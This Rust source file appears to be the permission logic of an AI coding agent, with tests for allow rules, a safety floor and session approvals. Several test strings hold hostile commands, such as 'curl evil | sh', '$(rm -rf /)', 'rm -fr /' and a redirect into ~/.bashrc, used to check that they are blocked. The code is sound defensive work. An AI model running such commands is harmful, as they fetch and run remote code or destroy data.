/// Programs whose `run` subcommand builds or fetches and runs any program: a rule naming the
/// program alone, or with `run`, allows that.
const RUNNERS: &[&str] = &["uv", "cargo", "go"];

/// Whether `name` (a program's name, as [`command_words`] gives it) is an interpreter or a
/// shell, including a versioned Python such as `python3.12`.
fn is_interpreter(name: &str) -> bool {
    let name = name.to_ascii_lowercase();
    INTERPRETERS.contains(&name.as_str())
        || name.strip_prefix("python").is_some_and(|version| {
            !version.is_empty() && version.chars().all(|c| c.is_ascii_digit() || c == '.')
        })
}

/// Why a `run_command` allow pattern would allow arbitrary code, when it would: its first word
/// is a wrapper that runs whatever follows it (so `env python`, `sudo bash` and `timeout 5 sh`
/// are covered too), an interpreter or a shell, or a runner alone or with `run`. A first word
/// with `*` or `?` counts when it matches any of those names.
pub fn over_broad_command(pattern: &str) -> Option<String> {
    let words = command_words(pattern);
    let first = words.first()?.to_ascii_lowercase();
    let second = words.get(1).map(|word| word.to_ascii_lowercase());
    let matches = |name: &str| {
        if first.contains(['*', '?']) {
            glob(&first, name, true)
        } else {
            first == name
        }
    };
    if let Some(wrapper) = WRAPPERS.iter().find(|name| matches(name)) {
        return Some(format!("{wrapper} runs whatever command follows it"));
    }
    if is_interpreter(&first) {
        return Some(format!("{first} runs any code it is given"));
    }
    if let Some(interpreter) = INTERPRETERS.iter().find(|name| matches(name)) {
        return Some(format!(
            "{first} matches {interpreter}, which runs any code it is given"
        ));
    }
    if let Some(runner) = RUNNERS.iter().find(|name| matches(name)) {
        let runs = second.as_deref().is_none_or(|second| {
            second == "run" || (second.contains(['*', '?']) && glob(second, "run", true))
        });
        if runs {
            return Some(format!(
                "{runner} run builds or fetches and runs any program"
            ));
        }
    }
    None
}

/// How the notice naming saved allow rules that are not applied ([`over_broad_rule`]) begins,
/// so a client can pick it out (the CLI also writes it to standard error).
pub const RULES_NOT_APPLIED: &str =
    "Saved allow rules that would let a command run any code are not applied";

/// Why a saved rule would allow arbitrary code, when it would: an allow rule for `run_command`
/// whose pattern [`over_broad_command`] flags. Such a rule is not applied to commands (the call
/// asks instead) but kept as saved; the daemon names it in a one-time notice.
pub fn over_broad_rule(rule: &PermissionRule) -> Option<String> {
    if rule.action != RuleAction::Allow || !tool_matches(rule, COMMAND_TOOL) || patternless(rule) {
        return None;
    }
    over_broad_command(&rule.pattern)
}

/// What "Always this session" remembers for a call, as the session's allowance set holds it:
/// the tool's name, except for `run_command`, where it is the exact command line (trimmed) and
/// never the whole tool. `None` for a `run_command` call without a command line: nothing is
/// remembered for it.
pub fn session_allowance(tool: &str, target: &Target) -> Option<String> {
    if tool != COMMAND_TOOL {
        return Some(tool.to_string());
    }
    match target {
        Target::Command(line) if !line.trim().is_empty() => {
            Some(format!("{COMMAND_TOOL} {}", line.trim()))
        }
        _ => None,
    }
}

/// The answer to whether a session's allowances cover a call: see [`session_allows`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SessionCheck {
    /// Whether the call runs without asking.
    pub allowed: bool,
    /// Whether the set holds a tool-wide `run_command` allowance, which is ignored: an
    /// allowance for commands covers one exact command line only.
    pub ignored_tool_wide: bool,
}

/// Whether `allowed` (a session's "Always this session" answers, as [`session_allowance`] keys
/// them) covers a call. A bare `run_command` entry, left by an older daemon or added by mistake,
/// never covers a command: only the exact command line's entry does.
pub fn session_allows(
    allowed: &std::collections::HashSet<String>,
    tool: &str,
    target: &Target,
) -> SessionCheck {
    let ignored_tool_wide = tool == COMMAND_TOOL && allowed.contains(COMMAND_TOOL);
    // A command's key is `run_command <line>`, never the bare tool name.
    let allowed = session_allowance(tool, target).is_some_and(|key| allowed.contains(&key));
    SessionCheck {
        allowed,
        ignored_tool_wide,
    }
}

/// Checks a rule before it is saved.
pub fn validate_rule(rule: &PermissionRule) -> Result<(), String> {
    let tool = rule.tool.trim();
    if tool.is_empty() {
        return Err("a rule needs a tool name (or * for every tool)".into());
    }
    if tool.chars().any(char::is_whitespace) {
        return Err(format!("{tool:?} is not a tool name"));
    }
    if tool.len() > MAX_RULE_TEXT || rule.pattern.len() > MAX_RULE_TEXT {
        return Err(format!(
            "a rule's tool and pattern are at most {MAX_RULE_TEXT} characters"
        ));
    }
    Ok(())
}

/// Checks a path grant before it is saved: an absolute path, or one starting with `~`.
pub fn validate_grant(grant: &PathGrant) -> Result<(), String> {
    let path = grant.path.trim();
    if path.is_empty() {
        return Err("a path grant needs a path".into());
    }
    let absolute = path == "~"
        || path.starts_with("~/")
        || path.starts_with("~\\")
        || path.starts_with('/')
        || path.starts_with("\\\\")
        || is_absolute_pattern(&path.replace('\\', "/"));
    if !absolute {
        return Err(format!(
            "{path} is not an absolute path (or one starting with ~)"
        ));
    }
    if path.contains(['*', '?']) {
        return Err(format!("{path}: a grant is a path, not a pattern"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use imperium_api::PathMode;

    const ASK: Decision = Decision::Ask { sticky: true };
    const ASK_EVERY_TIME: Decision = Decision::Ask { sticky: false };
    const RUN: Decision = Decision::Run;

    #[test]
    fn each_mode_decides_reads_edits_and_commands() {
        use CallKind::{Edit, Execute, Read};
        use PermissionMode::*;
        let table = [
            // mode, read, edit, execute, other that asks, other that does not
            (
                Ask,
                RUN,
                ASK_EVERY_TIME,
                ASK_EVERY_TIME,
                ASK_EVERY_TIME,
                RUN,
            ),
            (Default, RUN, ASK, ASK, ASK, RUN),
            (AcceptEdits, RUN, RUN, ASK, ASK, RUN),
            (
                Plan,
                RUN,
                Decision::Refuse(Refusal::Plan),
                Decision::Refuse(Refusal::Plan),
                Decision::Refuse(Refusal::Plan),
                RUN,
            ),
            (Full, RUN, RUN, RUN, RUN, RUN),
        ];
        for (mode, read, edit, execute, asks, quiet) in table {
            assert_eq!(decide_call(mode, Read, None, false), read, "{mode} read");
            assert_eq!(decide_call(mode, Edit, None, false), edit, "{mode} edit");
            assert_eq!(
                decide_call(mode, Execute, None, false),
                execute,
                "{mode} execute"
            );
            assert_eq!(
                decide_call(mode, CallKind::Other { asks: true }, None, false),
                asks,
                "{mode} other"
            );
            assert_eq!(
                decide_call(mode, CallKind::Other { asks: false }, None, false),
                quiet,
                "{mode} quiet other"
            );
        }
    }

    #[test]
    fn allow_rules_count_except_in_ask_and_plan_modes() {
        use PermissionMode::*;
        let allow = Some(RuleAction::Allow);
        assert_eq!(decide_call(Default, CallKind::Execute, allow, false), RUN);
        assert_eq!(
            decide_call(AcceptEdits, CallKind::Execute, allow, false),
            RUN
        );
        assert_eq!(
            decide_call(Ask, CallKind::Execute, allow, false),
            ASK_EVERY_TIME
        );
        assert_eq!(
            decide_call(Ask, CallKind::Edit, allow, false),
            ASK_EVERY_TIME
        );
        assert_eq!(
            decide_call(Plan, CallKind::Execute, allow, false),
            Decision::Refuse(Refusal::Plan)
        );
        assert_eq!(
            decide_call(Plan, CallKind::Edit, allow, false),
            Decision::Refuse(Refusal::Plan)
        );
        // Ask rules ask every time in every mode, full access included: a session's "always"
        // approval does not lift them.
        let ask = Some(RuleAction::Ask);
        for mode in PermissionMode::ALL {
            assert_eq!(
                decide_call(mode, CallKind::Read, ask, false),
                ASK_EVERY_TIME,
                "{mode}"
            );
            if mode != Plan {
                assert_eq!(
                    decide_call(mode, CallKind::Execute, ask, false),
                    ASK_EVERY_TIME,
                    "{mode}"
                );
            }
        }
        assert_eq!(
            decide_call(Ask, CallKind::Execute, ask, false),
            ASK_EVERY_TIME
        );
    }

    #[test]
    fn deny_rules_and_the_safety_floor_win_in_every_mode() {
        for mode in PermissionMode::ALL {
            for kind in [
                CallKind::Read,
                CallKind::Edit,
                CallKind::Execute,
                CallKind::Other { asks: false },
            ] {
                assert_eq!(
                    decide_call(mode, kind, Some(RuleAction::Deny), false),
                    Decision::Refuse(Refusal::Rule),
                    "{mode} {kind:?}"
                );
            }
            let floored = decide_call(mode, CallKind::Execute, Some(RuleAction::Allow), true);
            if mode == PermissionMode::Plan {
                assert_eq!(floored, Decision::Refuse(Refusal::Plan));
            } else {
                assert_eq!(floored, ASK_EVERY_TIME, "{mode}");
            }
        }
    }

    #[test]
    fn the_safety_floor_covers_destructive_commands_and_secret_files() {
        let floor = |line: &str| safety_floor(CallKind::Execute, &command(line));
        assert!(floor("rm -rf build"));
        assert!(floor("cargo test && rm -fr /"));
        assert!(floor("git push --force origin main"));
        assert!(floor("git reset --hard HEAD~1"));
        assert!(floor("sudo apt install x"));
        assert!(!floor("cargo test"));
        assert!(!floor("git push origin main"));
        assert!(!floor("rm notes.txt"));
        let path = |relative: &str| Target::Path {
            absolute: format!("/p/{relative}"),
            relative: Some(relative.into()),
        };
        assert!(safety_floor(CallKind::Edit, &path(".env")));
        assert!(safety_floor(CallKind::Edit, &path("config/.env.local")));
        assert!(safety_floor(CallKind::Edit, &path(".git/config")));
        assert!(safety_floor(CallKind::Edit, &path("certs/server.pem")));
        // The daemon's record of approved mod permissions, wherever it sits.
        assert!(safety_floor(CallKind::Edit, &path("mod-approvals.json")));
        assert!(safety_floor(
            CallKind::Edit,
            &path("data/imperium/mod-approvals.json")
        ));
        assert!(!safety_floor(CallKind::Read, &path("mod-approvals.json")));
        assert!(!safety_floor(
            CallKind::Edit,
            &path("mod-approvals.json.md")
        ));
        // The encrypted secret file, its key, lock and scratch files.
        for file in [
            "secrets.enc",
            "secrets.key",
            "secrets.lock",
            "secrets.backend",
            "secrets.0a1b2c3d4e5f6071.tmp",
        ] {
            assert!(
                safety_floor(CallKind::Edit, &path(&format!("data/imperium/{file}"))),
                "{file}"
            );
        }
        assert!(!safety_floor(CallKind::Edit, &path("src/secrets.rs")));
        assert!(!safety_floor(CallKind::Edit, &path("src/main.rs")));
        assert!(!safety_floor(CallKind::Read, &path(".env")));
        assert!(!safety_floor(
            CallKind::Edit,
            &path(".github/workflows/ci.yml")
        ));
    }

    #[test]
    fn writes_under_any_git_folder_are_floored_wherever_they_are() {
        // A linked worktree's main repository lies outside the working directory: its hooks
        // are reached by absolute path, with no relative path at all.
        let outside = |absolute: &str| Target::Path {
            absolute: absolute.into(),
            relative: None,
        };
        assert!(safety_floor(
            CallKind::Edit,
            &outside("/home/me/repo/.git/hooks/pre-commit")
        ));
        assert!(safety_floor(
            CallKind::Edit,
            &outside("D:/Git Repositories/repo/.git/worktrees/feature/HEAD")
        ));
        assert!(safety_floor(CallKind::Edit, &outside("/srv/repo/.git")));
        assert!(safety_floor(
            CallKind::Edit,
            &outside("/srv/keys/deploy.pem")
        ));
        assert!(!safety_floor(
            CallKind::Edit,
            &outside("/srv/repo/.gitignore")
        ));
        assert!(!safety_floor(CallKind::Edit, &outside("/srv/repo.git/x")));
    }

    #[test]
    fn the_mode_is_shared_by_clones() {
        let permissions = Permissions::default().with_mode(PermissionMode::Plan);
        let copy = permissions.clone();
        copy.set_mode(PermissionMode::Full);
        assert_eq!(permissions.mode(), PermissionMode::Full);
        assert_eq!(Permissions::default().mode(), PermissionMode::Default);
    }

    fn rule(tool: &str, pattern: &str, action: RuleAction) -> PermissionRule {
        PermissionRule {
            tool: tool.into(),
            pattern: pattern.into(),
            action,
        }
    }

    fn command(line: &str) -> Target {
        Target::Command(line.into())
    }

    fn path(absolute: &str, relative: Option<&str>) -> Target {
        Target::Path {
            absolute: absolute.into(),
            relative: relative.map(str::to_string),
        }
    }

    use RuleAction::{Allow, Ask, Deny};

    #[test]
    fn fixed_rules_add_to_the_users_rules_and_never_weaken_them() {
        let path = Target::Path {
            absolute: "/p/secret.txt".into(),
            relative: Some("secret.txt".into()),
        };
        for (tool, pattern) in [
            ("read_file", "secret.txt"),
            ("*", "secret.txt"),
            ("read_file", ""),
        ] {
            // The user's deny stands against a fixed ask of the same specificity.
            let denied = Permissions::new(
                SharedRules::new(vec![rule(tool, pattern, Deny)]),
                SharedRules::default(),
            )
            .with_fixed_rules(vec![rule(tool, pattern, Ask)]);
            assert_eq!(
                denied.evaluate("read_file", &path),
                Some(Deny),
                "{tool} {pattern}"
            );
        }
        // Where the user has no opinion, or only allows, a fixed ask or deny applies.
        let allowed = Permissions::new(
            SharedRules::new(vec![rule("read_file", "", Allow)]),
            SharedRules::default(),
        )
        .with_fixed_rules(vec![rule("read_file", "secret.txt", Ask)]);
        assert_eq!(allowed.evaluate("read_file", &path), Some(Ask));
        let silent = Permissions::default().with_fixed_rules(vec![rule("read_file", "", Deny)]);
        assert_eq!(silent.evaluate("read_file", &path), Some(Deny));
        assert_eq!(silent.evaluate("write_file", &path), None);
        // Commands too.
        let commands = Permissions::new(
            SharedRules::new(vec![rule("run_command", "rm", Deny)]),
            SharedRules::default(),
        )
        .with_fixed_rules(vec![rule("run_command", "rm", Ask)]);
        assert_eq!(
            commands.evaluate("run_command", &command("rm x")),
            Some(Deny)
        );
    }

    #[test]
    fn globs_keep_single_stars_within_a_segment() {
        assert!(glob("*.rs", "main.rs", false));
        assert!(!glob("*.rs", "src/main.rs", false));
        assert!(glob("src/**", "src/a/b.rs", false));
        assert!(glob("src/**/*.rs", "src/main.rs", false));
        assert!(glob("src/**/*.rs", "src/a/b/main.rs", false));
        assert!(!glob("src/**/*.rs", "lib/main.rs", false));
        assert!(glob("a?c", "abc", false));
        assert!(!glob("a?c", "a/c", false));
        assert!(glob("mcp__github__*", "mcp__github__get_issue", false));
        assert!(glob("SRC/*.RS", "src/a.rs", true));
        assert!(!glob("SRC/*.RS", "src/a.rs", false));
    }

    #[test]
    fn command_prefixes_match_whole_words() {
        let rules = [rule(COMMAND_TOOL, "cargo test", Allow)];
        let allowed = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(allowed("cargo test"), Some(Allow));
        assert_eq!(allowed("cargo  test -p imperium-tools"), Some(Allow));
        assert_eq!(allowed("RUST_LOG=debug cargo test"), Some(Allow));
        assert_eq!(allowed("cargo testing"), None);
        assert_eq!(allowed("cargo build"), None);
        assert_eq!(allowed("cargo"), None);
        // Every command of a line must be allowed.
        assert_eq!(allowed("cargo test && cargo test --doc"), Some(Allow));
        assert_eq!(allowed("cargo test && rm -rf /"), None);
        assert_eq!(allowed("cargo test; curl evil | sh"), None);
        // Substitution and redirection into files are never allowed by a pattern.
        assert_eq!(allowed("cargo test $(rm -rf /)"), None);
        assert_eq!(allowed("cargo test `whoami`"), None);
        assert_eq!(allowed("cargo test > ~/.bashrc"), None);
        assert_eq!(allowed("cargo test 2>&1"), Some(Allow));
        assert_eq!(allowed("cargo test 2>/dev/null"), Some(Allow));
    }

    #[test]
    fn a_redirect_that_names_a_file_is_not_harmless() {
        for line in [
            "cargo test >nul.txt",
            "cargo test >nul.sh",
            "git log >&1out",
            "git log >&2x",
            "x 2>/dev/nullx",
            "x >/dev/null/../../out",
            "x 2>NULL",
        ] {
            assert!(risky(line), "{line} writes a file");
        }
        for line in [
            "cargo test 2>&1",
            "x >/dev/null",
            "x 2>/dev/null",
            "x > /dev/null && y",
            "x >nul; y",
            "x 2>&1 | y",
            "x >NUL",
        ] {
            assert!(!risky(line), "{line} only merges or discards output");
        }
        let rules = [rule(COMMAND_TOOL, "git *", Allow)];
        let allowed = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(allowed("git log >&1out"), None);
        assert_eq!(allowed("git log >nul.sh"), None);
        assert_eq!(allowed("git log 2>&1 | head"), None, "head is not allowed");
        assert_eq!(allowed("git log 2>&1 && git status"), Some(Allow));
    }

    #[test]
    fn wildcards_in_command_patterns() {
        let rules = [
            rule(COMMAND_TOOL, "git *", Allow),
            rule(COMMAND_TOOL, "npm run test*", Allow),
        ];
        let check = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(check("git"), Some(Allow));
        assert_eq!(check("git status"), Some(Allow));
        assert_eq!(check("npm run test:unit"), Some(Allow));
        assert_eq!(check("npm run build"), None);
        let everything = [rule(COMMAND_TOOL, "", Allow)];
        assert_eq!(
            evaluate(&everything, &[], COMMAND_TOOL, &command("make > out.txt")),
            Some(Allow),
            "a rule without a pattern allows the whole tool"
        );
    }

    #[test]
    fn deny_rules_catch_any_part_of_a_line_and_the_program_path() {
        let rules = [
            rule(COMMAND_TOOL, "", Allow),
            rule(COMMAND_TOOL, "rm", Deny),
        ];
        let check = |line: &str| evaluate(&rules, &[], COMMAND_TOOL, &command(line));
        assert_eq!(check("ls"), Some(Allow));
        assert_eq!(check("rm -rf target"), Some(Deny));
        assert_eq!(check("ls && rm -rf target"), Some(Deny));
        assert_eq!(check("echo x | /bin/rm -rf y"), Some(Deny));
        assert_eq!(check("rm.exe x"), Some(Deny));
    }

    #[test]
    fn deny_beats_ask_beats_allow() {
        let target = path("/home/me/project/.env", Some(".env"));
        let all = [rule("read_file", "", Allow), rule("read_file", ".env", Ask)];
        assert_eq!(evaluate(&all, &[], "read_file", &target), Some(Ask));
        let with_deny = [
            rule("read_file", "", Allow),
            rule("read_file", ".env", Ask),
            rule("*", "**/.env", Deny),
        ];
        assert_eq!(evaluate(&with_deny, &[], "read_file", &target), Some(Deny));
        // A specific allow does not lift a broader deny.
        let broad_deny = [
            rule(COMMAND_TOOL, "", Deny),
            rule(COMMAND_TOOL, "ls", Allow),
        ];
        assert_eq!(
            evaluate(&broad_deny, &[], COMMAND_TOOL, &command("ls")),
            Some(Deny)
        );
        assert_eq!(evaluate(&[], &[], "read_file", &target), None);
    }

    #[test]
    fn environment_rules_override_global_rules_of_equal_specificity() {
        let global = [rule(COMMAND_TOOL, "cargo publish", Deny)];
        let environment = [rule(COMMAND_TOOL, "cargo publish", Allow)];
        let line = command("cargo publish --dry-run");
        assert_eq!(evaluate(&global, &[], COMMAND_TOOL, &line), Some(Deny));
        assert_eq!(
            evaluate(&global, &environment, COMMAND_TOOL, &line),
            Some(Allow)
        );
        // A less specific environment rule does not override a more specific global one.
        let broad = [rule(COMMAND_TOOL, "cargo", Allow)];
        assert_eq!(evaluate(&global, &broad, COMMAND_TOOL, &line), Some(Deny));
        // Nor does it the other way round: a global deny of the whole tool still wins.
        let global_all = [rule(COMMAND_TOOL, "", Deny)];
        assert_eq!(
            evaluate(&global_all, &environment, COMMAND_TOOL, &line),
            Some(Deny)
        );
        // An environment deny overrides a global allow of equal specificity, too.
        let allow_global = [rule("write_file", "", Allow)];
        let deny_env = [rule("write_file", "*", Deny)];
        assert_eq!(
            evaluate(
                &allow_global,
                &deny_env,
                "write_file",
                &path("/p/a", Some("a"))
            ),
            Some(Deny)
        );
    }

    #[test]
    fn path_patterns_match_names_relative_and_absolute_paths() {
        let target = path("/home/me/project/src/main.rs", Some("src/main.rs"));
        let check = |pattern: &str| {
            evaluate(
                &[rule("write_file", pattern, Deny)],
                &[],
                "write_file",
                &target,
            )
        };
        assert_eq!(check("*.rs"), Some(Deny));
        assert_eq!(check("main.rs"), Some(Deny));
        assert_eq!(check("src/**"), Some(Deny));
        assert_eq!(check("./src/*.rs"), Some(Deny));
        assert_eq!(check("/home/me/project/**"), Some(Deny));
        assert_eq!(check("/home/me/other/**"), None);
        assert_eq!(check("lib/**"), None);
        assert_eq!(check("*.toml"), None);
        // A folder pattern also matches the folder itself.
        let folder = path("/home/me/project/src", Some("src"));
        assert_eq!(
            evaluate(
                &[rule("list_dir", "src/**", Allow)],
                &[],
                "list_dir",
                &folder
            ),
            Some(Allow)
        );
        // Other tools match only rules without a pattern.
        assert_eq!(
            evaluate(
                &[rule("web_fetch", "x", Allow)],
                &[],
                "web_fetch",
                &Target::Other
            ),
            None
        );
        assert_eq!(
            evaluate(
                &[rule("mcp__github__*", "", Allow)],
                &[],
                "mcp__github__get_issue",
                &Target::Other
            ),
            Some(Allow)
        );
    }

    #[test]
    fn suggestions_name_the_command_or_folder() {
        let suggested = |target: Target| suggest(COMMAND_TOOL, &target).map(|rule| rule.pattern);
        assert_eq!(
            suggested(command("cargo test -p x")),
            Some("cargo test".into())
        );
        assert_eq!(suggested(command("ls -la")), Some("ls".into()));
        assert_eq!(suggested(command("npm run build")), Some("npm run".into()));
        assert_eq!(suggested(command("ls && rm x")), None);
        assert_eq!(suggested(command("echo > f")), None);
        let file = suggest("write_file", &path("/p/src/a.rs", Some("src/a.rs"))).unwrap();
        assert_eq!(file.pattern, "/p/src/**");
        assert_eq!(file.action, Allow);
        assert_eq!(suggest("web_fetch", &Target::Other).unwrap().pattern, "");
    }

    #[test]
    fn no_rule_is_suggested_for_an_interpreter_a_shell_a_runner_or_a_wrapper() {
        let suggested = |line: &str| suggest(COMMAND_TOOL, &command(line)).map(|rule| rule.pattern);
        let interpreters = [
            "python",
            "python3",
            "py",
            "node",
            "deno",
            "bun",
            "ruby",
            "perl",
            "php",
            "bash",
            "sh",
            "zsh",
            "fish",
            "pwsh",
            "powershell",
            "cmd",
            "npx",
            "uvx",
            "pipx",
            "java",
            "dotnet",
            "osascript",
            "wscript",
            "cscript",
            "mshta",
        ];
        for name in interpreters {
            for line in [
                format!("{name} script"),
                format!("{name} -c anything"),
                name.to_string(),
                format!("/usr/bin/{name} x"),
                format!("{}.exe x", name.to_uppercase()),
                format!("env {name} x"),
                format!("env FOO=1 {name} x"),
                format!("sudo {name} x"),
                format!("sudo -u root {name} x"),
                format!("nohup {name} x"),
                format!("timeout 5 {name} x"),
                format!("nice -n 5 {name} x"),
                format!("xargs {name}"),
            ] {
                assert_eq!(suggested(&line), None, "{line}");
            }
        }
        for line in [
            "python3.12 -m pip",
            "uv run x.py",
            "uv",
            "cargo run --release",
            "cargo --version",
            "go run main.go",
            "env",
            "sudo apt install x",
            "timeout 10 ls",
        ] {
            assert_eq!(suggested(line), None, "{line}");
        }
        // Ordinary programs still get their rule.
        assert_eq!(suggested("cargo test -p x"), Some("cargo test".into()));
        assert_eq!(suggested("uv pip list"), Some("uv pip".into()));
        assert_eq!(suggested("go vet ./..."), Some("go vet".into()));
        assert_eq!(suggested("git status"), Some("git status".into()));
    }

    #[test]
    fn saved_rules_that_run_any_code_are_flagged() {
        for pattern in [
            "python",
            "sudo",
            "env python",
            "bash -c",
            "uv run",
            "cargo",
            "py*",
            "npx *",
        ] {
            assert!(
                over_broad_rule(&rule("run_command", pattern, Allow)).is_some(),
                "{pattern}"
            );
            assert!(
                over_broad_rule(&rule("*", pattern, Allow)).is_some(),
                "{pattern}"
            );
            // Only allow rules widen anything.
            assert!(over_broad_rule(&rule("run_command", pattern, Deny)).is_none());
            assert!(over_broad_rule(&rule("run_command", pattern, Ask)).is_none());
        }
        for pattern in ["cargo test", "git status", "ls", "go vet"] {
            assert!(
                over_broad_rule(&rule("run_command", pattern, Allow)).is_none(),
                "{pattern}"
            );
        }
        assert!(over_broad_rule(&rule("write_file", "python", Allow)).is_none());
    }

    #[test]
    fn a_saved_rule_that_runs_any_code_is_not_applied_and_the_call_asks() {
        for (global, environment) in [
            (vec![rule(COMMAND_TOOL, "python", Allow)], Vec::new()),
            (Vec::new(), vec![rule(COMMAND_TOOL, "python", Allow)]),
            (vec![rule("*", "sudo", Allow)], Vec::new()),
        ] {
            let permissions =
                Permissions::new(SharedRules::new(global), SharedRules::new(environment));
            for line in ["python -c 'print(1)'", "sudo python x"] {
                let target = command(line);
                assert_eq!(permissions.evaluate(COMMAND_TOOL, &target), None, "{line}");
                assert_eq!(
                    permissions
                        .judge(COMMAND_TOOL, &target, CallKind::Execute, None)
                        .decision,
                    ASK,
                    "{line}"
                );
            }
        }
        // Deny and ask rules naming an interpreter still apply, and other allow rules too.
        let permissions = Permissions::new(
            SharedRules::new(vec![
                rule(COMMAND_TOOL, "python", Deny),
                rule(COMMAND_TOOL, "cargo test", Allow),
            ]),
            SharedRules::default(),
        );
        assert_eq!(
            permissions.evaluate(COMMAND_TOOL, &command("python -c x")),
            Some(Deny)
        );
        assert_eq!(
            permissions.evaluate(COMMAND_TOOL, &command("cargo test -p x")),
            Some(Allow)
        );
    }

    #[test]
    fn a_session_allowance_for_one_command_covers_that_command_only() {
        let mut allowed = std::collections::HashSet::new();
        allowed.insert(session_allowance(COMMAND_TOOL, &command("cargo test")).unwrap());
        allowed.insert(session_allowance("write_file", &Target::Other).unwrap());
        let check = |line: &str| session_allows(&allowed, COMMAND_TOOL, &command(line));
        assert!(check("cargo test").allowed);
        assert!(check("  cargo test ").allowed);
        assert!(!check("cargo test && rm -rf ~").allowed);
        assert!(!check("cargo test -p x").allowed);
        assert!(!check("python -c 'import os'").allowed);
        assert!(session_allows(&allowed, "write_file", &Target::Other).allowed);
        // A command without a line is never remembered.
        assert_eq!(session_allowance(COMMAND_TOOL, &Target::Other), None);
        assert!(!session_allows(&allowed, COMMAND_TOOL, &Target::Other).allowed);
    }

    #[test]
    fn a_stored_tool_wide_command_allowance_is_ignored() {
        let allowed: std::collections::HashSet<String> = [COMMAND_TOOL.to_string()].into();
        let check = session_allows(&allowed, COMMAND_TOOL, &command("rm -rf /"));
        assert!(!check.allowed);
        assert!(check.ignored_tool_wide);
        let other = session_allows(&allowed, "write_file", &Target::Other);
        assert!(!other.allowed && !other.ignored_tool_wide);
    }

    #[test]
    fn rules_and_grants_are_validated() {
        assert!(validate_rule(&rule("run_command", "cargo", Allow)).is_ok());
        assert!(validate_rule(&rule(" ", "", Allow)).is_err());
        assert!(validate_rule(&rule("run command", "", Allow)).is_err());
        let grant = |path: &str| PathGrant {
            path: path.into(),
            mode: PathMode::Read,
        };
        assert!(validate_grant(&grant("~/.cargo")).is_ok());
        assert!(validate_grant(&grant("/usr/local/go")).is_ok());
        assert!(validate_grant(&grant(r"C:\Users\me\.cargo")).is_ok());
        assert!(validate_grant(&grant("relative/path")).is_err());
        assert!(validate_grant(&grant("~/.cache/*")).is_err());
    }

    #[test]
    fn the_floor_guards_a_folder_the_daemon_protects() {
        protect_dir(std::path::Path::new("/floor-test-config/mods"));
        let path = |absolute: &str| Target::Path {
            absolute: absolute.to_string(),
            relative: None,
        };
        for inside in [
            "/floor-test-config/mods",
            "/floor-test-config/mods/demo/index.js",
            "/floor-test-config/mods/demo/../demo/mod.json",
        ] {
            assert!(safety_floor(CallKind::Edit, &path(inside)), "{inside}");
        }
        for outside in [
            "/floor-test-config/modsy/x.js",
            "/floor-test-config/plugins/x.js",
            "/elsewhere/floor-test-config/mods/x.js",
        ] {
            assert!(!safety_floor(CallKind::Edit, &path(outside)), "{outside}");
        }
        // Reading is never covered.
        assert!(!safety_floor(
            CallKind::Read,
            &path("/floor-test-config/mods/demo/index.js")
        ));
    }

    #[test]
    fn the_floor_guards_plugin_records_and_the_folders_plugins_load_from() {
        protect_dir(std::path::Path::new("/floor-plugin-config/plugins"));
        protect_dir(std::path::Path::new("/floor-plugin-data/marketplaces"));
        let path = |absolute: &str| Target::Path {
            absolute: absolute.to_string(),
            relative: None,
        };
        for guarded in [
            "/floor-plugin-config/plugins/x/hooks/hooks.json",
            "/floor-plugin-config/plugins/x",
            "/floor-plugin-data/marketplaces/mk/.claude-plugin/marketplace.json",
            "/floor-plugin-data/plugin-installs.json",
            "/floor-plugin-data/skill-installs.json",
            "/floor-plugin-data/plugin-migration.json",
            "/floor-plugin-data/marketplaces.json",
        ] {
            assert!(safety_floor(CallKind::Edit, &path(guarded)), "{guarded}");
            // Reading is never covered.
            assert!(!safety_floor(CallKind::Read, &path(guarded)), "{guarded}");
        }
        for open in [
            "/floor-plugin-config/pluginsy/x.json",
            "/floor-plugin-data/marketplaces.json.md",
            "/floor-plugin-data/plugin-installs.json.bak",
        ] {
            assert!(!safety_floor(CallKind::Edit, &path(open)), "{open}");
        }
    }

    #[test]
    fn writes_to_the_extension_folders_are_refused_and_others_are_not() {
        for name in ["skills", "agents", "commands", "mods", "plugins"] {
            refuse_writes_under(std::path::Path::new(&format!("/refuse-config/{name}")));
        }
        refuse_writes_under(std::path::Path::new("/refuse-config/config.toml"));
        for refused in [
            "/refuse-config/config.toml",
            "/refuse-config/skills/x/SKILL.md",
            "/refuse-config/skills",
            "/refuse-config/agents/a.md",
            "/refuse-config/commands/c.md",
            "/refuse-config/mods/m/mod.json",
            "/refuse-config/plugins/p/hooks/hooks.json",
        ] {
            assert!(refused_write(refused), "{refused}");
        }
        for allowed in [
            "/refuse-config/workspaces/w/file.rs",
            "/refuse-config/worktrees/t/file.rs",
            "/refuse-config/skillset/x.md",
            "/refuse-config/config.toml.bak",
            "/refuse-config-other/skills/x.md",
        ] {
            assert!(!refused_write(allowed), "{allowed}");
        }
        assert!(REFUSED_WRITE_ADVICE.contains("install_extension"));
    }

    #[test]
    fn a_protected_folder_is_guarded_by_its_resolved_path_too() {
        let base = tempfile::tempdir().unwrap();
        let real = base.path().join("real-config");
        std::fs::create_dir_all(real.join("mods")).unwrap();
        // A folder that does not exist yet is resolved through its existing ancestor.
        protect_dir(&base.path().join("not-yet").join("mods"));
        let path = |absolute: &std::path::Path| Target::Path {
            absolute: absolute.to_string_lossy().replace('\\', "/"),
            relative: None,
        };
        let canonical = base.path().canonicalize().unwrap();
        assert!(safety_floor(
            CallKind::Edit,
            &path(&canonical.join("not-yet/mods/x.js"))
        ));
        // Reached through a link, the real folder is still the one that is guarded.
        #[cfg(unix)]
        {
            let link = base.path().join("link-config");
            std::os::unix::fs::symlink(&real, &link).unwrap();
            protect_dir(&link.join("mods"));
            assert!(safety_floor(
                CallKind::Edit,
                &path(&real.canonicalize().unwrap().join("mods/x.js"))
            ));
            assert!(safety_floor(CallKind::Edit, &path(&link.join("mods/x.js"))));
        }
        assert!(!safety_floor(
            CallKind::Edit,
            &path(&canonical.join("elsewhere/x.js"))
        ));
    }

    /// In a capped turn every call but a read asks, every time: a tool that never asks (web
    /// search), one an allow rule lets run (an MCP or extension tool) and a command alike. A
    /// deny rule and plan mode still refuse, and the caps count, so two holders do not undo
    /// each other.
    #[test]
    fn a_capped_turn_asks_for_every_call_but_a_read() {
        let allow = |tool: &str| {
            Permissions::new(
